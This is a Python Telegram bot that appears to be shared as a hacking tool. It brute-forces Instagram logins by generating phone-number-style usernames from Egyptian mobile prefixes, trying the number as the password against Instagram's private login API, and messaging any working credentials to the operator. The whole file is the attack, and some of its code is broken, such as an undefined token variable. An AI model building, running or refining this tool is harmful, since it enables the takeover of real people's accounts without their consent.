#=========
import random
import requests
from telebot import types
import telebot
from uuid import uuid4
from user_agent import generate_user_agent
#=========
h=0
b=0
e = "✺"
rr = "✅"
no = "❌"
A =("0123456789")
B =("374","376")
C = '\033[1;37m'
D = '\033[1;36m'
E = '\033[1;36m'
F = '\033[1;33m'
G = '\033[1;31m'
L='\033[1;32m'
r=("="*60)
r = requests.session()
print("""MAHDI
    \x1b[1;93m ⌯Tool by 𓆩MADSI𓆪⌯
    \x1b[1;32m ⌯Tele : \x1b[1;95m@anonfud8 ✨ @aonit8\x1b[1;32m ⌯              
""")  

#=========
TOKEN = input(F+'['+G+'+'+F+']'+D+'TOKEN ='+L)
bot = telebot.TeleBot(tok)
#========
st = types.InlineKeyboardButton(text=f"{e}Start{e}",callback_data="s")
fac = types.InlineKeyboardButton(text=f"{e}FaceBook{e}",callback_data="fa")
hu = types.InlineKeyboardButton(text=f"{e}Hunt{rr}",callback_data="hf")
huu = types.InlineKeyboardButton(text=f"{e}Hunt{rr}",callback_data="hi")
ins = types.InlineKeyboardButton(text=f"{e}Instagram{e}",callback_data="is")
dev = types.InlineKeyboardButton(text=f"{e}XDEV{e}",url="https://t.me/anonsuli")
fcc = "https://t.me/anonsha91"
inn = "https://t.me/anonsuli"
@bot.message_handler(commands=["start"])
def f(message):
 key = types.InlineKeyboardMarkup()
 key.row_width=1
 key.add(st,dev)
 name = message.chat.first_name
 bot.reply_to(message,f"""
{e}- - - - - - - - - - {e}
{e}- Welcome {name}
{e}- Welcome Bot Hunt
{e}- Facebook & Instagram
{e}- - - - - - - - - - {e}""",reply_markup=key)
@bot.callback_query_handler(func=lambda call:True)
def f(call):
 if call.data=="s":
  start(call.message)
 if call.data=="hf":
  sr(call.message)
def start(message):
 key = types.InlineKeyboardMarkup()
 key.row_width=1
 key.add(hu)
 name = message.chat.first_name
 bot.send_photo(message.chat.id,inn,f"""
{e}- - - - - - - - - - {e}
{e}- Welcome Bot Instagram {rr}
{e}- - - - - - - - - - {e}""",reply_markup=key)
def sr(message):
 u = "0987654321"
 s = "01100","01090","01211"
 h=0
 b=0
 name = message.chat.first_name
 chat_id = str(message.chat.id)
 strt =  bot.send_message(message.chat.id, f'Hello {name}')
 while True:
  ra = random.choice(s)
  se = str(''.join(random.choice(u)for i in range(6)))
  user = "2"+ra+se
  pasw = ra+se
  req = requests.session()
  log_head = {
        'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
         'Cookie':'missing',
         'Accept-Encoding':'gzip, deflate',
         'Accept-Language':'en-US',
         'X-IG-Capabilities':'3brTvw==',
         'X-IG-Connection-Type':'WIFI',
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
         'Host':'i.instagram.com'}
  uid = str(uuid4())
  log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
  r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
  if "logged_in_user" in r.text:
   h+=1
   bot.send_message(message.chat.id,f"""
{e}- - - - - - - - - - {e}
{e}- New Acc Instagram {rr}
{e}- Username : {user}
{e}- Password : {pasw}
{e}- - - - - - - - - - {e}
{e}- @anonfud8 + @anonit8 """)
  else:
   b+=1
   res = f"""
{e}- - - - - - - - - - {e}
{e}- Bad : {b} {no}
{e}- Hit : {h} {rr}
{e}- Email : {pasw}
{e}- - - - - - - - - - {e}"""

   bot.edit_message_text(text=res,chat_id=int(chat_id),message_id=strt.message_id)
bot.polling(True)